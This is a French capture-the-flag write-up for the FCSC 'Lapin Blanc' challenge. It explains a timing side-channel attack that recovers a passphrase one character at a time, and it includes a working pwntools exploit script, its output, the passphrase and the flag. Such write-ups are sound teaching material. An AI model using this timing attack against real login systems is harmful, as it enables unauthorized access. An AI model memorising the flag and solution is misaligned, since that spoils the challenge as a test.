# Lapin Blanc

Last edited time: April 26, 2023 6:54 PM
Owner: Anonymous
Tags: Python, Side Channel
Verification: Verified

> **Titre du Challenge:** Lapin Blanc
> 
> 
> **Catégorie:** Side Channel & Faults Attack
> 
> **Difficulté : ⭐**
> 
> **Points:** 500
> 

**Énoncé —**

```jsx
Saurez-vous retrouver la phrase de passe pour accéder au pays des merveilles d'Alice ?

La porte n'est pas très patiente, vous n'avez que 10 minutes pour l'ouvrir. Bonne chance !

nc challenges.france-cybersecurity-challenge.fr 2350
```

**Résolution —**

En se connectant à la machine distante, on se retrouve donc face au prompt suivant : 

```jsx
[0000014057] Initializing Wonderland...
[0001326126] Searching for a tiny golden key...
[0001678195] Looking for a door...
[0001990278] Trying to unlock the door...

    __________________
    ||              ||
    ||   THE DOOR   ||
    ||              ||  .--------------------------.
    |)              ||  | What's the magic phrase? |
    ||              ||  /--------------------------'
    ||         ^_^  ||
    ||              ||
    |)              ||
    ||              ||
    ||              ||
____||____.----.____||_______________________________________

Answer:
```

On remarque tout de suite une information capitale au déroulement de notre attaque : le temps passé au moment de chaque print. En répondant au prompt, on remarque la même chose : 

```jsx
Answer: test
[0106404660] The door is thinking...
[0106407727] Your magic phrase is invalid, the door refuses to open.
Answer:
```

Ici `[0106404660] The door is thinking...` représente le temps passé au moment d’envoyer notre réponse et `[0106407727] Your magic phrase is invalid, the door refuses to open.`

le temps passé après que l’algorithme ai comparé notre envoi avec le vrai mot de passe.

**→ en soustrayant le premier temps au deuxième, on retrouve le temps pris par l’algorithme pour comparer notre envoi au mot de passe !**

Grâce à cette donnée, nous allons donc maintenant pouvoir tester différentes entrées et comparer le temps que prend l’algorithme pour chacune d’entre elles, essayons d’abord lettres par lettre : 

( Ce processus a été automatisé par un script que nous améliorerons plus bas ) 

```python
from pwn import remote
REMOTE = remote("challenges.france-cybersecurity-challenge.fr", 2350)
# on prend les cractères 32 à 126 de la table ascii.
myTable = [ chr(i) for i in range(32,127) ]
print(myTable)
cpt = 0
#### ON SKIP LE PREMIER PROMPT
received = REMOTE.recvuntil(b'Answer')
#### DES LE SECOND PROMPT, ON REPOND.
while cpt != len(myTable) : 
    lettre = chr(ord(myTable[0])+cpt)
    REMOTE.sendline(""+lettre)
    received = REMOTE.recvuntil(b'Answer')
    temps1 = int(received.decode().split('] The d')[0].split(': [')[1])
    temps2 = int(received.decode().split('] Your')[0].split('\n[')[1])
    cpt+=1
    print(f" Tentative {lettre} : {cpt} : T2-T1 : {temps2-temps1}")
```

Ce qui nous donne pour la première lettre : 

```python
...
 Tentative A : 34 : T2-T1 : 3076
 Tentative B : 35 : T2-T1 : 3071
 Tentative C : 36 : T2-T1 : 3075
 Tentative D : 37 : T2-T1 : 3079
 Tentative E : 38 : T2-T1 : 3067
 Tentative F : 39 : T2-T1 : 3020
 Tentative G : 40 : T2-T1 : 3073
 Tentative H : 41 : T2-T1 : 3074
 Tentative I : 42 : T2-T1 : 53148
 Tentative J : 43 : T2-T1 : 3023
 Tentative K : 44 : T2-T1 : 3072
 Tentative L : 45 : T2-T1 : 3071
 Tentative M : 46 : T2-T1 : 3072
 Tentative N : 47 : T2-T1 : 3077
 Tentative O : 48 : T2-T1 : 3066
...
```

On constate que le temps de réponse pour la lettre **`I`** est significativement plus élevé que pour toutes les autres lettres. La première lettre de la phrase de passe est donc un `**I**`. On automatise maintenant ( **Voir Exploit** ) le script afin que celui-ci procède au teste au fur et à mesure de la phrase complète.

On obtient le résultat suivant : 

```python
 Password :  I
 Password :  I'
 Password :  I'm
 Password :  I'm
...
 Password :  I'm late, I'm 
 Password :  I'm late, I'm l
 Password :  I'm late, I'm la
 Password :  I'm late, I'm lat
...
 Password :  I'm late, I'm late! For a very important d
 Password :  I'm late, I'm late! For a very important da
 Password :  I'm late, I'm late! For a very important dat
 Password :  I'm late, I'm late! For a very important date
 Password :  I'm late, I'm late! For a very important date!
 Flag : FCSC{t1m1Ng_1s_K3y_8u7_74K1nG_u00r_t1mE_is_NEce554rY}
```

La pass phrase était donc “ `I’m late, I’m late! For a very important date!`” 

Et le Flag : `FCSC{t1m1Ng_1s_K3y_8u7_74K1nG_u00r_t1mE_is_NEce554rY}`

**Exploit —**

```python
from pwn import remote,context

REMOTE = remote("challenges.france-cybersecurity-challenge.fr", 2350)

myTable = [ chr(i) for i in range(32,127) ] # on prend les cractères 32 à 126 de la table ascii.
myPasswordAndTimes = []
cpt = 0
myPassword = ""

#### ON SKIP LE PREMIER PROMPT
received = REMOTE.recvuntil(b'Answer')

#### DES LE SECOND PROMPT, ON REPOND.
REMOTE.recv()
while True:
    while cpt != len(myTable) : 
        try:
            lettre = chr(ord(myTable[0])+cpt)
            REMOTE.sendline(myPassword+lettre)
            received = REMOTE.recv()
            received2 = REMOTE.recv()

            if 'FCSC' in received2.decode() :
                print(" Flag : "+received2.decode().split(']')[1].strip()+"\n")
                break

            temps1 = int(received.decode().split('] The d')[0].split('[')[1])
            temps2 = int(received2.decode().split('] Your')[0].split('[')[1])
            ecartTemps = temps2-temps1
            cpt+=1
            myPasswordAndTimes.append([lettre,ecartTemps])
            #print(f" Tentative {lettre} : {cpt} : T2-T1 : {ecartTemps}")

            if (cpt == len(myTable)):
                tempList = [j for i,j in myPasswordAndTimes]
                myPassword = myPassword + myPasswordAndTimes[tempList.index(max(tempList))][0]
                myPasswordAndTimes = []
                print("\n Password : ",myPassword)
                cpt = 0
        except:
            exit()
```

@Noct 

---

**Références :**

[https://joshuanatan.medium.com/dam-ctf-2020-write-up-misc-d822ea2a2a42](https://joshuanatan.medium.com/dam-ctf-2020-write-up-misc-d822ea2a2a42)
[https://ctftime.org/writeup/24133](https://ctftime.org/writeup/24133)

[https://en.wikipedia.org/wiki/Side-channel_attack](https://en.wikipedia.org/wiki/Side-channel_attack)